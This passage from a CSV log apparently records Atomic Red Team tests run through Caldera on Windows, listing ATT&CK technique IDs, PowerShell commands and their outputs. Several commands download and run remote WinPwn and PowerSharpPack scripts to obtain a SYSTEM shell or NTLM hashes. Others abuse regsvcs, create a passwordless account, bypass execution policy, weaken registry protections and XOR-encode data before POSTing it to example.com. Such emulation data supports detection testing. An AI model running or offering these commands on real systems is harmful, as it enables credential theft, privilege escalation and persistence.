\'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4=\'; $Content = [System.Convert]::FromBase64String($key); Set-Content $env:Temp\\key.snk -Value $Content -Encoding Byte; C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:""$Env:TEMP\\T1218.009.dll"" /target:library /keyfile:$env:Temp\\key.snk aaaa08_T1218.009.cs; C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe $Env:TEMP\\T1218.009.dll']","['Executes the Uninstall Method, No Admin Rights Required, Requires SNK. Upon execution, ""I shouldn\'t really execute"" will be displayed\nalong with other information about the assembly being installed.\n']",['Regsvcs Uninstall Method Call Test'],"[{'tactic': 'defense-evasion', 'technique_name': 'Signed Binary Proxy Execution: Regsvcs/Regasm', 'technique_id': 'T1218.009'}]",['windows'],['psh']
310,Initial-Success,multiple,multiple :: BITS Jobs,multiple :: ['Bitsadmin Download (PowerShell)'],multiple :: T1197,operation__atomic_windows_depfalse_pshtrue__t1197__multiple__bits_jobs__5a9be3b1696cc0cce8557f9596547e13__SAVED_2024-03-07_223516,atomic_windows_depfalse_pshtrue__t1197__multiple__bits_jobs__5a9be3b1696cc0cce8557f9596547e13,['5a9be3b1696cc0cce8557f9596547e13'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination $env:TEMP\\bitsadmin2_flag.ps1'],['This test simulates an adversary leveraging bitsadmin.exe to download\nand execute a payload leveraging PowerShell\n\nUpon execution you will find a github markdown file downloaded to the Temp directory\n'],['Bitsadmin Download (PowerShell)'],"[{'tactic': 'multiple', 'technique_name': 'BITS Jobs', 'technique_id': 'T1197'}]",['windows'],['psh']
312,Initial-Success,credential-access,credential-access :: Forced Authentication,credential-access :: ['WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS'],credential-access :: T1187,operation__atomic_windows_depfalse_pshtrue__t1187__credential-access__forced_authentication__6b8a391237b7169d02dd6538f8290345__SAVED_2024-03-07_222826,atomic_windows_depfalse_pshtrue__t1187__credential-access__forced_authentication__6b8a391237b7169d02dd6538f8290345,['6b8a391237b7169d02dd6538f8290345'],1,0,1,[1],['puma-4::.:896a6866a9425fbede4dd43e643d9fd6ae45fc5c6f36e740:896a6866a9425fbede4dd43e643d9fd6ae45fc5c6f36e740:1122334455667788'],[''],['0'],"['iex(new-object net.webclient).downloadstring(\'https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1\'); Invoke-Internalmonologue -command ""-Downgrade true -impersonate true -restore true""']",['PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS technique via function of WinPwn'],['WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS'],"[{'tactic': 'credential-access', 'technique_name': 'Forced Authentication', 'technique_id': 'T1187'}]",['windows'],['psh']
315,Initial-Success,persistence,persistence :: Create Account: Local Account,persistence :: ['Create a new user in PowerShell'],persistence :: T1136.001,operation__atomic_windows_depfalse_pshtrue__t1136_001__persistence__create_account-_local_account__f39aace719f4cdcf8569001f7a25aabf__SAVED_2024-03-07_220056,atomic_windows_depfalse_pshtrue__t1136_001__persistence__create_account-_local_account__f39aace719f4cdcf8569001f7a25aabf,['f39aace719f4cdcf8569001f7a25aabf'],1,0,1,[1],['Name                 Enabled Description----                 ------- -----------T1136.001_PowerShell True               '],[''],['0'],"['New-LocalUser -Name ""T1136.001_PowerShell"" -NoPassword']","['Creates a new user in PowerShell. Upon execution, details about the new account will be displayed in the powershell session. To verify the\nnew account, run ""net user"" in powershell or CMD and observe that there is a new user named ""T1136.001_PowerShell""\n']",['Create a new user in PowerShell'],"[{'tactic': 'persistence', 'technique_name': 'Create Account: Local Account', 'technique_id': 'T1136.001'}]",['windows'],['psh']
317,Initial-Success,discovery,discovery :: Network Share Discovery,discovery :: ['Network Share Discovery PowerShell'],discovery :: T1135,operation__atomic_windows_depfalse_pshtrue__t1135__discovery__network_share_discovery__25b475e94dd2d70fcc66b2ce43c8f718__SAVED_2024-03-07_213322,atomic_windows_depfalse_pshtrue__t1135__discovery__network_share_discovery__25b475e94dd2d70fcc66b2ce43c8f718,['25b475e94dd2d70fcc66b2ce43c8f718'],1,0,1,[1],['Name   ScopeName Path       Description  ----   --------- ----       -----------  ADMIN$ *         C:\\WINDOWS Remote Admin C$     *         C:\\        Default shareIPC$   *                    Remote IPC   '],[''],['0'],['get-smbshare'],"['Network Share Discovery utilizing PowerShell. The computer name variable may need to be modified to point to a different host\nUpon execution, avalaible network shares will be displayed in the powershell session\n']",['Network Share Discovery PowerShell'],"[{'tactic': 'discovery', 'technique_name': 'Network Share Discovery', 'technique_id': 'T1135'}]",['windows'],['psh']
325,Initial-Success,multiple,multiple :: Create Process with Token,multiple :: ['WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique'],multiple :: T1134.002,operation__atomic_windows_depfalse_pshtrue__t1134_002__multiple__create_process_with_token__fdc26580786ac9d3ffc38aea053cbd29__SAVED_2024-03-07_205208,atomic_windows_depfalse_pshtrue__t1134_002__multiple__create_process_with_token__fdc26580786ac9d3ffc38aea053cbd29,['fdc26580786ac9d3ffc38aea053cbd29'],1,0,1,[1],['[+] Current user is: puma-4[!] Searching for WinLogon PID![!] Found Winlogon Process ID: 616[+] SeDebugPrivilege enabled![+] OpenProcess() success![+] OpenProcessToken() success![+] ImpersonatedLoggedOnUser() success![+] Current user is: SYSTEM[+] Reverting thread to original user context[+] DuplicateTokenEx() success![+] Process spawned!'],[''],['0'],"[""iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem""]",['Get SYSTEM shell - Pop System Shell using Token Manipulation technique via function of WinPwn'],['WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique'],"[{'tactic': 'multiple', 'technique_name': 'Create Process with Token', 'technique_id': 'T1134.002'}]",['windows'],['psh']
332,Initial-Success,command-and-control,command-and-control :: Data Encoding: Standard Encoding,command-and-control :: ['XOR Encoded data.'],command-and-control :: T1132.001,operation__atomic_windows_depfalse_pshtrue__t1132_001__command-and-control__data_encoding-_standard_encoding__5fd6b6b635191898a202dc7c21aa6068__SAVED_2024-03-07_200358,atomic_windows_depfalse_pshtrue__t1132_001__command-and-control__data_encoding-_standard_encoding__5fd6b6b635191898a202dc7c21aa6068,['5fd6b6b635191898a202dc7c21aa6068'],1,0,1,[1],"['StatusCode        : 200StatusDescription : OKContent           : <!doctype html>                    <html>                    <head>                        <title>Example Domain</title>                                            <meta charset=""utf-8"" />                        <meta http-equiv=""Content-type"" content=""text/html; charset=utf-8"" />                        <meta name=""viewport"" conten...RawContent        : HTTP/1.1 200 OK                    Connection: close                    Accept-Ranges: bytes                    Content-Length: 1256                    Cache-Control: max-age=604800                    Content-Type: text/html; charset=UTF-8                    Date: Fri, 08 Mar 2024 01:01:41 GMT                    Expires: Fri...Forms             : {}Headers           : {[Connection, close], [Accept-Ranges, bytes], [Content-Length, 1256], [Cache-Control,                     max-age=604800]...}Images            : {}InputFields       : {}Links             : {@{innerHTML=More information...; innerText=More information...; outerHTML=<A                     href=""https://www.iana.org/domains/example"">More information...</A>; outerText=More                     information...; tagName=A; href=https://www.iana.org/domains/example}}ParsedHtml        : System.__ComObjectRawContentLength  : 1256']",[''],['0'],"['$plaintext = ([system.Text.Encoding]::UTF8.getBytes(""Path\\n----\\nC:\\Users\\victim"")); $key = ""abcdefghijklmnopqrstuvwxyz123456""; $cyphertext =  @(); for ($i = 0; $i -lt $plaintext.Count; $i++) {;  $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length]; }; $cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext); [System.Net.ServicePointManager]::Expect100Continue = $false; Invoke-WebRequest -Uri example.com -Method POST -Body $cyphertext -DisableKeepAlive']",['XOR encodes the data with a XOR key.\nReference - https://gist.github.com/loadenmb/8254cee0f0287b896a05dcdc8a30042f\n'],['XOR Encoded data.'],"[{'tactic': 'command-and-control', 'technique_name': 'Data Encoding: Standard Encoding', 'technique_id': 'T1132.001'}]",['windows'],['psh']
333,Initial-Success,discovery,discovery :: System Time Discovery,discovery :: ['System Time Discovery - PowerShell'],discovery :: T1124,operation__atomic_windows_depfalse_pshtrue__t1124__discovery__system_time_discovery__6913e132cdd2d9c29294490c2fbef2eb__SAVED_2024-03-07_195705,atomic_windows_depfalse_pshtrue__t1124__discovery__system_time_discovery__6913e132cdd2d9c29294490c2fbef2eb,['6913e132cdd2d9c29294490c2fbef2eb'],1,0,1,[1],"['Thursday, March 7, 2024 7:54:46 PM']",[''],['0'],['Get-Date'],"['Identify the system time via PowerShell. Upon execution, the system time will be displayed.\n']",['System Time Discovery - PowerShell'],"[{'tactic': 'discovery', 'technique_name': 'System Time Discovery', 'technique_id': 'T1124'}]",['windows'],['psh']
335,Initial-Success,discovery,discovery :: Peripheral Device Discovery,discovery :: ['WinPwn - printercheck'],discovery :: T1120,operation__atomic_windows_depfalse_pshtrue__t1120__discovery__peripheral_device_discovery__941eb886a05444e588fd6c17d992df98__SAVED_2024-03-07_194321,atomic_windows_depfalse_pshtrue__t1120__discovery__peripheral_device_discovery__941eb886a05444e588fd6c17d992df98,['941eb886a05444e588fd6c17d992df98'],1,0,1,[1],"['Done!For more information on these attacks, check out the following information:https://www.defcon.org/images/defcon-19/dc-19-presentations/Heiland/DEFCON-19-Heiland-Printer-To-Pwnd.pdf']",[''],['0'],"[""$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); printercheck -noninteractive -consoleoutput""]",['Search for printers / potential vulns using printercheck function of WinPwn'],['WinPwn - printercheck'],"[{'tactic': 'discovery', 'technique_name': 'Peripheral Device Discovery', 'technique_id': 'T1120'}]",['windows'],['psh']
336,Initial-Success,discovery,discovery :: Peripheral Device Discovery,discovery :: ['Win32_PnPEntity Hardware Inventory'],discovery :: T1120,operation__atomic_windows_depfalse_pshtrue__t1120__discovery__peripheral_device_discovery__7b9c7afaefa59aab759b49af0d699ac1__SAVED_2024-03-07_193626,atomic_windows_depfalse_pshtrue__t1120__discovery__peripheral_device_discovery__7b9c7afaefa59aab759b49af0d699ac1,['7b9c7afaefa59aab759b49af0d699ac1'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\\T1120_collection.txt; $Space,$Heading,$Break,$Data = Get-Content $env:TEMP\\T1120_collection.txt; @($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne """" } |Set-Content $env:TEMP\\T1120_collection.txt']",['Perform peripheral device discovery using Get-WMIObject Win32_PnPEntity'],['Win32_PnPEntity Hardware Inventory'],"[{'tactic': 'discovery', 'technique_name': 'Peripheral Device Discovery', 'technique_id': 'T1120'}]",['windows'],['psh']
337,Initial-Success,collection,collection :: Automated Collection,collection :: ['Recon information for export with PowerShell'],collection :: T1119,operation__atomic_windows_depfalse_pshtrue__t1119__collection__automated_collection__344e7eaf650763e0d3e9f02e62c1cf4b__SAVED_2024-03-07_192942,atomic_windows_depfalse_pshtrue__t1119__collection__automated_collection__344e7eaf650763e0d3e9f02e62c1cf4b,['344e7eaf650763e0d3e9f02e62c1cf4b'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['Get-Service > $env:TEMP\\T1119_1.txt; Get-ChildItem Env: > $env:TEMP\\T1119_2.txt; Get-Process > $env:TEMP\\T1119_3.txt'],"['collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt\nto see what was collected.\n']",['Recon information for export with PowerShell'],"[{'tactic': 'collection', 'technique_name': 'Automated Collection', 'technique_id': 'T1119'}]",['windows'],['psh']
338,Initial-Success,collection,collection :: Automated Collection,collection :: ['Automated Collection PowerShell'],collection :: T1119,operation__atomic_windows_depfalse_pshtrue__t1119__collection__automated_collection__0c7c18db582bff4d0da4b4f8fdb2be49__SAVED_2024-03-07_192245,atomic_windows_depfalse_pshtrue__t1119__collection__automated_collection__0c7c18db582bff4d0da4b4f8fdb2be49,['0c7c18db582bff4d0da4b4f8fdb2be49'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['New-Item -Path $env:TEMP\\T1119_powershell_collection -ItemType Directory -Force | Out-Null; Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\\T1119_powershell_collection}'],"['Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_powershell_collection\nto see what was collected.\n']",['Automated Collection PowerShell'],"[{'tactic': 'collection', 'technique_name': 'Automated Collection', 'technique_id': 'T1119'}]",['windows'],['psh']
343,Initial-Success,collection,collection :: Screen Capture,collection :: ['Windows Screen Capture (CopyFromScreen)'],collection :: T1113,operation__atomic_windows_depfalse_pshtrue__t1113__collection__screen_capture__64569d9eb87191fc3cbf365a656e31ab__SAVED_2024-03-07_185518,atomic_windows_depfalse_pshtrue__t1113__collection__screen_capture__64569d9eb87191fc3cbf365a656e31ab,['64569d9eb87191fc3cbf365a656e31ab'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['Add-Type -AssemblyName System.Windows.Forms; $screen = [Windows.Forms.SystemInformation]::VirtualScreen; $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height; $graphic = [Drawing.Graphics]::FromImage($bitmap); $graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size); $bitmap.Save(""$env:TEMP\\T1113.png"")']",['Take a screen capture of the desktop through a call to the [Graphics.CopyFromScreen] .NET API.\n\n[Graphics.CopyFromScreen]: https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen\n'],['Windows Screen Capture (CopyFromScreen)'],"[{'tactic': 'collection', 'technique_name': 'Screen Capture', 'technique_id': 'T1113'}]",['windows'],['psh']
344,Initial-Success,defense-evasion,defense-evasion :: Modify Registry,defense-evasion :: ['Snake Malware Registry Blob'],defense-evasion :: T1112,operation__atomic_windows_depfalse_pshtrue__t1112__defense-evasion__modify_registry__f4d3c5648b8d2fab9b061016eb91f478__SAVED_2024-03-07_184138,atomic_windows_depfalse_pshtrue__t1112__defense-evasion__modify_registry__f4d3c5648b8d2fab9b061016eb91f478,['f4d3c5648b8d2fab9b061016eb91f478'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['$typicalPath = ""HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds""; $randomBytes = New-Object Byte[] 0x1000; (New-Object Random).NextBytes($randomBytes); New-ItemProperty -Path $typicalPath -Name ""AtomicSnake"" -Value $randomBytes -PropertyType Binary -Force | Out-Null']","[""The following Atomic Test creates a registry blob in HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds, which is related to Snake Malware. Per the report, upon execution, Snake's WerFault.exe will attempt to decrypt an encrypted blob within the Windows\nregistry that is typically found at HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds. The encrypted data includes the AES key, IV, and path that is used to find and decrypt the file containing Snake's kernel driver and kernel driver loader.\n""]",['Snake Malware Registry Blob'],"[{'tactic': 'defense-evasion', 'technique_name': 'Modify Registry', 'technique_id': 'T1112'}]",['windows'],['psh']
345,Initial-Success,defense-evasion,defense-evasion :: Modify Registry,defense-evasion :: ['BlackByte Ransomware Registry Changes - Powershell'],defense-evasion :: T1112,operation__atomic_windows_depfalse_pshtrue__t1112__defense-evasion__modify_registry__d2f6cb279552f1b65a9805d63eed1689__SAVED_2024-03-07_183447,atomic_windows_depfalse_pshtrue__t1112__defense-evasion__modify_registry__d2f6cb279552f1b65a9805d63eed1689,['d2f6cb279552f1b65a9805d63eed1689'],1,0,1,[1],['LocalAccountTokenFilterPolicy : 1PSPath                        : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Curre                                ntVersion\\Policies\\SystemPSParentPath                  : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Curre                                ntVersion\\PoliciesPSChildName                   : SystemPSDrive                       : HKLMPSProvider                    : Microsoft.PowerShell.Core\\RegistryEnableLinkedConnections : 1PSPath                  : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVers                          ion\\Policies\\SystemPSParentPath            : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVers                          ion\\PoliciesPSChildName             : SystemPSDrive                 : HKLMPSProvider              : Microsoft.PowerShell.Core\\RegistryLongPathsEnabled : 1PSPath           : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\FileSystemPSParentPath     : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\ControlPSChildName      : FileSystemPSDrive          : HKLMPSProvider       : Microsoft.PowerShell.Core\\Registry'],[''],['0'],"['New-ItemProperty ""HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force; New-ItemProperty ""HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force; New-ItemProperty ""HKLM:\\SYSTEM\\CurrentControlSet\\Control\\FileSystem"" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force']","['This task recreates the steps taken by BlackByte ransomware before it worms to other machines via Powershell.  See ""Preparing to Worm"" section: https://redcanary.com/blog/blackbyte-ransomware/\nThe steps are as follows:\n<ol>\n    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>\n    <li>2. Enable OS to share network connections between different privilege levels</li>\n    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>\n</ol>\nThe registry keys and their respective values will be created upon successful execution.\n']",['BlackByte Ransomware Registry Changes - Powershell'],"[{'tactic': 'defense-evasion', 'technique_name': 'Modify Registry', 'technique_id': 'T1112'}]",['windows'],['psh']
346,Initial-Success,defense-evasion,defense-evasion :: Modify Registry,defense-evasion :: ['Javascript in registry'],defense-evasion :: T1112,operation__atomic_windows_depfalse_pshtrue__t1112__defense-evasion__modify_registry__6722535bf5a14b87b5772b739f53321f__SAVED_2024-03-07_181404,atomic_windows_depfalse_pshtrue__t1112__defense-evasion__modify_registry__6722535bf5a14b87b5772b739f53321f,['6722535bf5a14b87b5772b739f53321f'],1,0,1,[1],['T1112        : <script>PSPath       : Microsoft.PowerShell.Core\\Registry::HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet                SettingsPSParentPath : Microsoft.PowerShell.Core\\Registry::HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersionPSChildName  : Internet SettingsPSDrive      : HKCUPSProvider   : Microsoft.PowerShell.Core\\Registry'],[''],['0'],"['New-ItemProperty ""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"" -Name T1112 -Value ""<script>""']","['Upon execution, a javascript block will be placed in the registry for persistence.\nAdditionally, open Registry Editor to view the modified entry in HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings.\n']",['Javascript in registry'],"[{'tactic': 'defense-evasion', 'technique_name': 'Modify Registry', 'technique_id': 'T1112'}]",['windows'],['psh']
347,Initial-Success,defense-evasion,defense-evasion :: Modify Registry,defense-evasion :: ['Modify Internet Zone Protocol Defaults in Current User Registry - PowerShell'],defense-evasion :: T1112,operation__atomic_windows_depfalse_pshtrue__t1112__defense-evasion__modify_registry__1296157a99b29c9a81fb1ce4eaf24cbd__SAVED_2024-03-07_180714,atomic_windows_depfalse_pshtrue__t1112__defense-evasion__modify_registry__1296157a99b29c9a81fb1ce4eaf24cbd,['1296157a99b29c9a81fb1ce4eaf24cbd'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"[""Set-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'http' -Value 0; Set-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'https' -Value 0""]","['This test simulates an adversary modifying the Internet Zone Protocol Defaults in the registry of the currently logged-in user using PowerShell. Such modifications can be indicative of an adversary attempting to weaken browser security settings. \nTo verify the effects of the test:\n1. Open the Registry Editor (regedit.exe).\n2. Navigate to ""HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults"".\n3. Check for the presence of the ""http"" and ""https"" DWORD values set to `0`.\nOr run:\n```powershell\nGet-ItemProperty -Path \'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\' | Select-Object http,https\n```\n']",['Modify Internet Zone Protocol Defaults in Current User Registry - PowerShell'],"[{'tactic': 'defense-evasion', 'technique_name': 'Modify Registry', 'technique_id': 'T1112'}]",['windows'],['psh']
349,Initial-Success,defense-evasion,defense-evasion :: Modify Registry,defense-evasion :: ['Change Powershell Execution Policy to Bypass'],defense-evasion :: T1112,operation__atomic_windows_depfalse_pshtrue__t1112__defense-evasion__modify_registry__0424ccb447bfa66b94162266f55ecd52__SAVED_2024-03-07_180032,atomic_windows_depfalse_pshtrue__t1112__defense-evasion__modify_registry__0424ccb447bfa66b94162266f55ecd52,['0424ccb447bfa66b94162266f55ecd52'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine'],['Attackers need to change the powershell execution policy in order to run their malicious powershell scripts.\nThey can either specify it during the execution of the powershell script or change the registry value for it.\n'],['Change Powershell Execution Policy to Bypass'],"[{'tactic': 'defense-evasion', 'technique_name': 'Modify Registry', 'technique_id': 'T1112'}]",['windows'],['psh']
350,Initial-Success,defense-evasion,defense-evasion :: Modify Registry,defense-evasion :: ['Add domain to Trusted sites Zone'],defense-evasion :: T1112,operation__atomic_windows_depfalse_pshtrue__t1112__defense-evasion__modify_registry__7a6e495200cd37c66f02e7bc070b61a9__SAVED_2024-03-07_182101,atomic_windows_depfalse_pshtrue__t1112__defense-evasion__modify_registry__7a6e495200cd37c66f02e7bc070b61a9,['7a6e495200cd37c66f02e7bc070b61a9'],1,0,1,[1],['    Hive: HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\bad-domain.comName                           Property                                                                                ----                           --------                                                                                bad-subdomain                                                                                                          https        : 2PSPath       : Microsoft.PowerShell.Core\\Registry::HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet                Settings\\ZoneMap\\Domains\\bad-domain.com\\bad-subdomainPSParentPath : Microsoft.PowerShell.Core\\Registry::HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet                Settings\\ZoneMap\\Domains\\bad-domain.comPSChildName  : bad-subdomainPSDrive      : HKCUPSProvider   : Microsoft.PowerShell.Core\\Registryhttp         : 2PSPath       : Microsoft.PowerShell.Core\\Registry::HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet                Settings\\ZoneMap\\Domains\\bad-domain.com\\bad-subdomainPSParentPath : Microsoft.PowerShell.Core\\Registry::HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet                Settings\\ZoneMap\\Domains\\bad-domain.comPSChildName  : bad-subdomainPSDrive      : HKCUPSProvider   : Microsoft.PowerShell.Core\\Registry*            : 2PSPath       : Microsoft.PowerShell.Core\\Registry::HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet                Settings\\ZoneMap\\Domains\\bad-domain.com\\bad-subdomainPSParentPath : Microsoft.PowerShell.Core\\Registry::HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet                Settings\\ZoneMap\\Domains\\bad-domain.comPSChildName  : bad-subdomainPSDrive      : HKCUPSProvider   : Microsoft.PowerShell.Core\\Registry'],[''],['0'],"['$key= ""HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\bad-domain.com\\""; $name =""bad-subdomain""; new-item $key -Name $name -Force; new-itemproperty $key$name -Name https -Value 2 -Type DWORD; new-itemproperty $key$name -Name http  -Value 2 -Type DWORD; new-itemproperty $key$name -Name *     -Value 2 -Type DWORD;']","['Attackers may add a domain to the trusted site zone to bypass defenses. Doing this enables attacks such as c2 over office365.\nUpon execution, details of the new registry entries will be displayed.\nAdditionally, open Registry Editor to view the modified entry in HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\.\n\nhttps://www.blackhat.com/docs/us-17/wednesday/us-17-Dods-Infecting-The-Enterprise-Abusing-Office365-Powershell-For-Covert-C2.pdf\n']",['Add domain to Trusted sites Zone'],"[{'tactic': 'defense-evasion', 'technique_name': 'Modify Registry', 'technique_id': 'T1112'}]",['windows'],['psh']
359,Initial-Success,execution,execution :: Native API,execution :: ['WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique'],execution :: T1106,operation__atomic_windows_depfalse_pshtrue__t1106__execution__native_api__f6d9c3fbee5549837ea37ff933291656__SAVED_2024-03-07_165915,atomic_windows_depfalse_pshtrue__t1106__execution__native_api__f6d9c3fbee5549837ea37ff933291656,['f6d9c3fbee5549837ea37ff933291656'],1,0,1,[1],['  _______                            ._____________.__                _________               __                         \\      \\ _____    _____   ____   __| _/\\______   \\__|_____   ____  /   _____/__.__. _______/  |_  ____   _____          /   |   \\\\__  \\  /     \\_/ __ \\ / __ |  |     ___/  \\____ \\_/ __ \\ \\_____  <   |  |/  ___/\\   __\\/ __ \\ /     \\        /    |    \\/ __ \\|  Y Y  \\  ___// /_/ |  |    |   |  |  |_> >  ___/ /        \\___  |\\___ \\  |  | \\  ___/|  Y Y  \\       \\____|__  (____  /__|_|  /\\___  >____ |  |____|   |__|   __/ \\___  >_______  / ____/____  > |__|  \\___  >__|_|  /               \\/     \\/      \\/     \\/     \\/              |__|        \\/        \\/\\/         \\/            \\/      \\/                                                                                                                                                                         By S3cur3Th1sSh1t                                                                                                                                                                                                                                                                                                              [*] Creating an instance of a Named Pipe.[*] Server Thread with ID: 11 created.[*] Starting Pipe Client Service.[!] Pipe accessible for groupEveryone[*] Waiting for a client to connect to the Pipe.[*] Pipe Client connected on thread ID: 11 -> Reading data from the Pipe.[*] Number of bytes read: 8[*] Our buffer contains: Uuup! [*] Impersonate Named Pipe Client.[*] Get 